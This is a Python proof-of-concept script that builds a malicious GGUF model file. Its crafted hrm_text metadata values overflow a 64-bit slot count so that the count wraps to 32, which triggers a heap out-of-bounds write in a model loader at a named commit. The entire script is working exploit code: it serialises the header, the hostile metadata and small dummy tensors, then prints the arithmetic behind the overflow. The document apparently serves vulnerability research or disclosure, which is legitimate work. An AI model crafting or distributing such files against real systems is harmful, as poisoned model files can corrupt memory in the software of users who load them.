#!/usr/bin/env python3
"""
Build a minimal malicious GGUF v3 file that triggers the hrm-text slot-count
wraparound -> heap OOB write at HEAD 29b52d398b294509746ec0a3f28948a3107c0213.

Attack metadata (all uint32 in GGUF):
  hrm_text.block_count            = 32
  hrm_text.hrm.layers_per_stack   = 6
  hrm_text.hrm.h_cycles           = 1824726041
  hrm_text.hrm.l_cycles           = 1684887087
True product 6*1824726041*1684887088 = 2^64+32; uint64 n_slot wraps to 32,
passing load_arch_hparams(). load_arch_tensors() then computes int slot_base
and writes layers[32..37] past the 32-element vector at h=0,l=5.

To let the loading loop reach the OOB point, blk.0..blk.5 must carry the
required tensors created in the h=0,l=0 pass (create_tensor flags=0). We use
tiny F32 tensors (n_embd=8, n_head=2, n_ff=8, n_vocab=8) so the file is ~tens of KB.
"""
import struct, sys, os

# ---- GGUF v3 constants ----
GGUF_MAGIC   = b"GGUF"
GGUF_VERSION = 3
# metadata value types
TYPE_UINT32  = 4
TYPE_UINT64  = 10
TYPE_STRING  = 8
TYPE_FLOAT32 = 6
# tensor dtypes
GGML_F32 = 0

ALIGN = 32

def pad(buf, align=ALIGN):
    while len(buf) % align:
        buf.append(0)

def enc_str(s):
    b = s.encode("utf-8")
    return struct.pack("<Q", len(b)) + b

def enc_kv_str(key, val):
    return enc_str(key) + struct.pack("<I", TYPE_STRING) + enc_str(val)

def enc_kv_u32(key, val):
    return enc_str(key) + struct.pack("<I", TYPE_UINT32) + struct.pack("<I", val & 0xFFFFFFFF)

def enc_kv_u64(key, val):
    return enc_str(key) + struct.pack("<I", TYPE_UINT64) + struct.pack("<Q", val & 0xFFFFFFFFFFFFFFFF)

def enc_kv_f32(key, val):
    return enc_str(key) + struct.pack("<I", TYPE_FLOAT32) + struct.pack("<f", float(val))

# ---- tiny dims ----
N_EMBD = 8
N_HEAD = 2
N_FF   = 8
N_VOCAB = 8
N_CTX  = 8
N_LAYER = 32           # block_count (n_layer_all)
LPS = 6                # n_hrm_layers_per_stack
H_CYCLES = 1824726041
L_CYCLES = 1684887087

ARCH = "hrm_text"
def k(name):  # KV key with arch prefix
    return f"{ARCH}.{name}"

# ---- metadata ----
meta = []
meta.append(("general.architecture", "string", ARCH))
meta.append(("general.name", "string", "hrm-poc"))
# no_vocab: vocab load returns early (only adds dummy tokens), no token arrays needed
meta.append(("tokenizer.ggml.model", "string", "no_vocab"))
meta.append((k("block_count"), "u32", N_LAYER))
meta.append((k("context_length"), "u32", N_CTX))
meta.append((k("embedding_length"), "u32", N_EMBD))
meta.append((k("feed_forward_length"), "u32", N_FF))
meta.append((k("vocab_size"), "u32", N_VOCAB))
meta.append((k("attention.head_count"), "u32", N_HEAD))
meta.append((k("attention.head_count_kv"), "u32", N_HEAD))
# required by load_arch_hparams() first line
meta.append((k("attention.layer_norm_rms_epsilon"), "f32", 1e-5))
# rope dimension default = n_embd/n_head = 4; set explicitly small
meta.append((k("rope.dimension_count"), "u32", N_EMBD // N_HEAD))
# ---- malicious HRM fields ----
meta.append((k("hrm.layers_per_stack"), "u32", LPS))
meta.append((k("hrm.h_cycles"), "u32", H_CYCLES))
meta.append((k("hrm.l_cycles"), "u32", L_CYCLES))

# ---- tensors ----
# shape (ne) = list of dims; GGUF stores dims in reverse (ne0 first)
# F32 tensor -> data = 4 * product(dims) bytes
tensors = []
def T(name, dims):
    tensors.append((name, list(dims)))

# global required
T("token_embd.weight", [N_VOCAB, N_EMBD])       # {n_embd, n_vocab} -> dims reversed
T("hrm.z_l_init", [N_EMBD])
# output is NOT_REQUIRED (duplicated from token_embd if absent); skip it

n_embd_head_k = N_EMBD // N_HEAD  # 4
n_embd_q = N_HEAD * n_embd_head_k  # 8
# fused qkv NOT_REQUIRED; provide it to avoid wq/wk/wv fallback (3 tensors vs 1)
for bid in range(LPS):
    T(f"blk.{bid}.attn_qkv.weight", [N_EMBD, n_embd_q * 3])  # {n_embd, n_embd_qkv} -> dims [ne0, ne1]
    T(f"blk.{bid}.attn_gate.weight", [n_embd_q, N_EMBD])      # {n_embd, n_head*n_embd_head_k}
    T(f"blk.{bid}.attn_output.weight", [N_EMBD, n_embd_q])    # {n_head*n_embd_head_k, n_embd}
    T(f"blk.{bid}.ffn_gate.weight", [N_FF, N_EMBD])           # {n_embd, n_ff}
    T(f"blk.{bid}.ffn_down.weight", [N_EMBD, N_FF])           # {n_ff, n_embd}
    T(f"blk.{bid}.ffn_up.weight", [N_FF, N_EMBD])             # {n_embd, n_ff}

# ---- serialize ----
buf = bytearray()
buf += GGUF_MAGIC
buf += struct.pack("<I", GGUF_VERSION)
buf += struct.pack("<Q", len(tensors))       # tensor_count
buf += struct.pack("<Q", len(meta))          # kv_count
for key, typ, val in meta:
    if typ == "string":
        buf += enc_kv_str(key, val)
    elif typ == "u32":
        buf += enc_kv_u32(key, val)
    elif typ == "u64":
        buf += enc_kv_u64(key, val)
    elif typ == "f32":
        buf += enc_kv_f32(key, val)

# tensor info records
tensor_infos = []
for name, dims in tensors:
    buf += enc_str(name)
    buf += struct.pack("<I", len(dims))
    for d in dims:
        buf += struct.pack("<Q", d)
    buf += struct.pack("<I", GGML_F32)
    buf += struct.pack("<Q", 0)   # offset: filled after data section base known

# data section starts after alignment
pad(buf)
data_start = len(buf)

# write tensor data, record offsets
offsets = []
for name, dims in tensors:
    offsets.append(len(buf) - data_start)
    n = 1
    for d in dims: n *= d
    buf += b"\x00" * (4 * n)      # F32 zeros
pad(buf)

# patch offsets into tensor info section: re-serialize to patch precisely
# (rebuild header+meta+tensorinfo to find offset field positions)
# Simpler: recompute by walking the same layout
off = len(GGUF_MAGIC) + 4 + 8 + 8
for key, typ, val in meta:
    kb = key.encode()
    off += 8 + len(kb) + 4
    if typ == "string":
        vb = val.encode(); off += 8 + len(vb)
    elif typ == "u32":
        off += 4
    elif typ == "u64":
        off += 8
    elif typ == "f32":
        off += 4
offset_positions = []
for name, dims in tensors:
    nb = name.encode()
    off += 8 + len(nb)           # name length + bytes
    off += 4                     # n_dims
    off += 8 * len(dims)         # dims
    off += 4                     # dtype
    offset_positions.append(off) # position of 8-byte offset field
    off += 8
for pos, tdata_off in zip(offset_positions, offsets):
    struct.pack_into("<Q", buf, pos, tdata_off)

out = sys.argv[1] if len(sys.argv) > 1 else "poc_malicious.gguf"
with open(out, "wb") as f:
    f.write(buf)
print(f"WROTE {out}  size={len(buf)} bytes  tensors={len(tensors)}  meta={len(meta)}")
print(f"true_product = {LPS}*{H_CYCLES}*({L_CYCLES}+1) = {LPS*H_CYCLES*(L_CYCLES+1)} = 2^64 + {LPS*H_CYCLES*(L_CYCLES+1) - (1<<64)}")
